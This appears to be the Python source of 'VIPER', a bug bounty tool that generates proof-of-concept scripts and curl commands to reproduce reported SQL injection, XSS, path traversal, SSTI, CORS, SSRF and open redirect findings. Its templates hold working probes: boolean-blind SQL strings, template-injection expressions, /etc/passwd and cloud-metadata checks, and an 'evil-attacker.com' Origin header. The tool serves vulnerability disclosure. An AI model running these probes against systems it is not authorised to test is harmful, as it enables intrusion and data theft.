#!/usr/bin/env python3
"""
VIPER PoC Generator - Create reproducible proof-of-concept scripts for findings.

Generates standalone Python scripts and curl commands that bug bounty
programs can use to verify reported vulnerabilities.
"""

import hashlib
import json
from datetime import datetime
from pathlib import Path
from typing import Dict, Optional
from urllib.parse import urlparse

REPORTS_DIR = Path(__file__).parent.parent / "reports" / "pocs"


TEMPLATES = {
    "sqli": '''#!/usr/bin/env python3
"""
PoC: SQL Injection
Target: {url}
Found:  {found_at}
CVSS:   {cvss}
"""
import requests
import sys

URL = "{url}"
PAYLOAD = """{payload}"""
MARKER = """{marker}"""

def test():
    print("[*] Testing SQL Injection...")
    r = requests.get(URL, verify=False, timeout=15)
    print(f"[*] Status: {{r.status_code}}, Length: {{len(r.text)}}")

    if MARKER and MARKER.lower() in r.text.lower():
        print(f"[+] CONFIRMED: Marker '{{MARKER}}' found in response")
        return True

    # Boolean blind verification
    print("[*] Running boolean blind test...")
    from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
    parsed = urlparse(URL)
    params = parse_qs(parsed.query, keep_blank_values=True)
    if not params:
        print("[-] No query parameters for blind test")
        return False

    param = list(params.keys())[0]
    base = urlunparse(parsed._replace(query=""))

    true_p = dict(params); true_p[param] = ["1' AND '1'='1"]
    false_p = dict(params); false_p[param] = ["1' AND '1'='2"]

    r_true = requests.get(f"{{base}}?{{urlencode(true_p, doseq=True)}}", verify=False, timeout=15)
    r_false = requests.get(f"{{base}}?{{urlencode(false_p, doseq=True)}}", verify=False, timeout=15)

    diff = abs(len(r_true.text) - len(r_false.text))
    print(f"[*] True response: {{len(r_true.text)}} bytes, False response: {{len(r_false.text)}} bytes, Diff: {{diff}}")

    if diff > 50 or r_true.status_code != r_false.status_code:
        print("[+] CONFIRMED: Boolean blind SQL injection (responses differ)")
        return True

    print("[-] Could not confirm SQL injection")
    return False

if __name__ == "__main__":
    sys.exit(0 if test() else 1)
''',

    "xss": '''#!/usr/bin/env python3
"""
PoC: Cross-Site Scripting (XSS)
Target: {url}
Found:  {found_at}
CVSS:   {cvss}
"""
import requests
import sys

URL = "{url}"
PAYLOAD = """{payload}"""

def test():
    print("[*] Testing XSS reflection...")
    r = requests.get(URL, verify=False, timeout=15)
    print(f"[*] Status: {{r.status_code}}, Length: {{len(r.text)}}")

    if PAYLOAD in r.text:
        # Check not encoded
        encoded = PAYLOAD.replace("<", "&lt;").replace(">", "&gt;")
        if encoded in r.text and PAYLOAD not in r.text.replace(encoded, ""):
            print("[-] Payload is HTML-encoded")
            return False
        print("[+] CONFIRMED: Payload reflected unencoded")
        csp = r.headers.get("Content-Security-Policy", "")
        if csp:
            print(f"[!] Note: CSP present: {{csp[:100]}}...")
        return True

    print("[-] Payload not reflected in response")
    return False

if __name__ == "__main__":
    sys.exit(0 if test() else 1)
''',

    "lfi": '''#!/usr/bin/env python3
"""
PoC: Local File Inclusion / Path Traversal
Target: {url}
Found:  {found_at}
CVSS:   {cvss}
"""
import requests
import re
import sys

URL = "{url}"

def test():
    print("[*] Testing LFI / Path Traversal...")
    r = requests.get(URL, verify=False, timeout=15)
    print(f"[*] Status: {{r.status_code}}, Length: {{len(r.text)}}")

    if re.search(r"root:[x*]:0:0:", r.text):
        print("[+] CONFIRMED: /etc/passwd content found")
        print(f"[+] Evidence: {{r.text[:200]}}")
        return True

    if re.search(r"\\[boot loader\\]|\\[operating systems\\]", r.text):
        print("[+] CONFIRMED: Windows system file content found")
        return True

    print("[-] No recognizable file content")
    return False

if __name__ == "__main__":
    sys.exit(0 if test() else 1)
''',

    "ssti": '''#!/usr/bin/env python3
"""
PoC: Server-Side Template Injection (SSTI)
Target: {url}
Found:  {found_at}
CVSS:   {cvss}
"""
import requests
import sys
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

URL = "{url}"
PAYLOAD = """{payload}"""

TESTS = [
    ("{{{{7*7}}}}", "49"),
    ("{{{{7*'7'}}}}", "7777777"),
    ("${{7*7}}", "49"),
]

def test():
    print("[*] Testing SSTI...")
    parsed = urlparse(URL)
    params = parse_qs(parsed.query, keep_blank_values=True)
    if not params:
        print("[-] No query parameters")
        return False

    param = list(params.keys())[0]
    base = urlunparse(parsed._replace(query=""))

    for expr, expected in TESTS:
        test_p = dict(params); test_p[param] = [expr]
        r = requests.get(f"{{base}}?{{urlencode(test_p, doseq=True)}}", verify=False, timeout=15)
        if expected in r.text and expr not in r.text:
            print(f"[+] CONFIRMED: {{expr}} evaluated to {{expected}}")
            return True
        print(f"[*] {{expr}} -> not evaluated")

    print("[-] No template evaluation detected")
    return False

if __name__ == "__main__":
    sys.exit(0 if test() else 1)
''',

    "cors": '''#!/usr/bin/env python3
"""
PoC: CORS Misconfiguration
Target: {url}
Found:  {found_at}
CVSS:   {cvss}
"""
import requests
import sys

URL = "{url}"
EVIL_ORIGIN = "https://evil-attacker.com"

def test():
    print("[*] Testing CORS misconfiguration...")
    r = requests.get(URL, headers={{"Origin": EVIL_ORIGIN}}, verify=False, timeout=15)
    print(f"[*] Status: {{r.status_code}}")

    acao = r.headers.get("Access-Control-Allow-Origin", "")
    acac = r.headers.get("Access-Control-Allow-Credentials", "")

    print(f"[*] ACAO: {{acao}}")
    print(f"[*] ACAC: {{acac}}")

    if EVIL_ORIGIN in acao and acac.lower() == "true":
        print("[+] CONFIRMED: Origin reflected + credentials allowed")
        print("[+] Impact: Attacker can steal authenticated user data cross-origin")
        return True
    elif EVIL_ORIGIN in acao:
        print("[!] Origin reflected but no credentials (limited impact)")
        return True
    elif acao == "*" and acac.lower() == "true":
        print("[-] ACAO=* + ACAC=true is blocked by browsers (not exploitable)")
        return False

    print("[-] CORS not exploitable")
    return False

if __name__ == "__main__":
    sys.exit(0 if test() else 1)
''',

    "ssrf": '''#!/usr/bin/env python3
"""
PoC: Server-Side Request Forgery (SSRF)
Target: {url}
Found:  {found_at}
CVSS:   {cvss}
"""
import requests
import sys

URL = "{url}"

def test():
    print("[*] Testing SSRF...")
    r = requests.get(URL, verify=False, timeout=15)
    print(f"[*] Status: {{r.status_code}}, Length: {{len(r.text)}}")

    indicators = ["ami-id", "instance-id", "iam", "security-credentials",
                   "computeMetadata", "access_token", "169.254.169.254"]
    for ind in indicators:
        if ind.lower() in r.text.lower():
            print(f"[+] CONFIRMED: Cloud metadata indicator found: {{ind}}")
            return True

    print("[-] No SSRF indicators found")
    return False

if __name__ == "__main__":
    sys.exit(0 if test() else 1)
''',

    "open_redirect": '''#!/usr/bin/env python3
"""
PoC: Open Redirect
Target: {url}
Found:  {found_at}
CVSS:   {cvss}
"""
import requests
import sys

URL = "{url}"

def test():
    print("[*] Testing open redirect...")
    r = requests.get(URL, allow_redirects=False, verify=False, timeout=15)
    print(f"[*] Status: {{r.status_code}}")

    if r.status_code in (301, 302, 303, 307, 308):
        location = r.headers.get("Location", "")
        print(f"[*] Location: {{location}}")
        if location and "evil" in location.lower():
            print("[+] CONFIRMED: Redirects to external domain")
            return True

    print("[-] No open redirect confirmed")
    return False

if __name__ == "__main__":
    sys.exit(0 if test() else 1)
''',
}

# Generic fallback
TEMPLATES["generic"] = '''#!/usr/bin/env python3
"""
PoC: {vuln_type}
Target: {url}
Found:  {found_at}
CVSS:   {cvss}
"""
import requests
import sys

URL = "{url}"
PAYLOAD = """{payload}"""
MARKER = """{marker}"""

def test():
    print("[*] Testing {vuln_type}...")
    r = requests.get(URL, verify=False, timeout=15)
    print(f"[*] Status: {{r.status_code}}, Length: {{len(r.text)}}")
    if MARKER and MARKER.lower() in r.text.lower():
        print(f"[+] Marker found: {{MARKER}}")
        return True
    print("[-] Marker not found")
    return False

if __name__ == "__main__":
    sys.exit(0 if test() else 1)
'''


class PoCGenerator:
    """Generate standalone PoC scripts for validated findings."""

    def __init__(self, output_dir: Path = REPORTS_DIR):
        self.output_dir = output_dir
        self.output_dir.mkdir(parents=True, exist_ok=True)

    def generate(self, finding: Dict) -> str:
        """Generate PoC script content for a finding."""
        vuln_type = finding.get("attack", finding.get("vuln_type", "generic")).lower()
        template = TEMPLATES.get(vuln_type, TEMPLATES["generic"])

        # Build template variables with safe defaults
        variables = {
            "url": finding.get("url", ""),
            "payload": finding.get("payload", ""),
            "marker": finding.get("marker", finding.get("evidence", "")),
            "cvss": finding.get("cvss", 0.0),
            "found_at": finding.get("found_at", finding.get("timestamp", datetime.utcnow().isoformat())),
            "vuln_type": vuln_type,
            "evidence": finding.get("evidence", ""),
        }

        try:
            return template.format(**variables)
        except KeyError:
            # Fallback: use generic template
            return TEMPLATES["generic"].format(**variables)

    def generate_curl(self, finding: Dict) -> str:
        """Generate curl command to reproduce the finding."""
        url = finding.get("url", "")
        vuln_type = finding.get("attack", finding.get("vuln_type", "")).lower()

        cmd = f'curl -sk -o /dev/null -w "%{{http_code}} %{{size_download}}" "{url}"'

        if vuln_type in ("cors", "cors_misconfiguration"):
            cmd = f'curl -sk -H "Origin: https://evil-attacker.com" -D - "{url}" | grep -i "access-control"'
        elif vuln_type == "open_redirect":
            cmd = f'curl -sk -o /dev/null -w "%{{http_code}} %{{redirect_url}}" -L0 "{url}"'

        return cmd

    def save_poc(self, finding: Dict) -> Path:
        """Save PoC script to file. Returns path to saved file."""
        vuln_type = finding.get("attack", finding.get("vuln_type", "unknown"))
        url_hash = hashlib.md5(finding.get("url", "").encode()).hexdigest()[:8]
        timestamp = datetime.utcnow().strftime("%Y%m%d_%H%M%S")

        filename = f"poc_{vuln_type}_{url_hash}_{timestamp}.py"
        filepath = self.output_dir / filename

        script = self.generate(finding)

        # Append curl command as comment
        curl = self.generate_curl(finding)
        script += f"\n# Quick test with curl:\n# {curl}\n"

        filepath.write_text(script)
        return filepath

    def generate_report_entry(self, finding: Dict) -> str:
        """Generate markdown entry for a finding report."""
        vuln_type = finding.get("attack", finding.get("vuln_type", "unknown"))
        url = finding.get("url", "")
        severity = finding.get("severity", "unknown")
        confidence = finding.get("confidence", 0.0)
        curl = self.generate_curl(finding)

        return f"""### {vuln_type.upper()} — {severity.upper()} (confidence: {confidence:.0%})

**URL:** `{url}`

**Reproduce:**
```bash
{curl}
```

**Evidence:** {finding.get('evidence', finding.get('validation', 'N/A'))}

---
"""


if __name__ == "__main__":
    # Demo
    demo_finding = {
        "attack": "cors",
        "url": "https://example.com/api/user",
        "payload": "Origin: https://evil.com",
        "marker": "Access-Control-Allow-Origin: https://evil.com",
        "cvss": 8.6,
        "severity": "high",
        "confidence": 0.95,
    }
    gen = PoCGenerator()
    print(gen.generate(demo_finding))
    print("---")
    print("Curl:", gen.generate_curl(demo_finding))
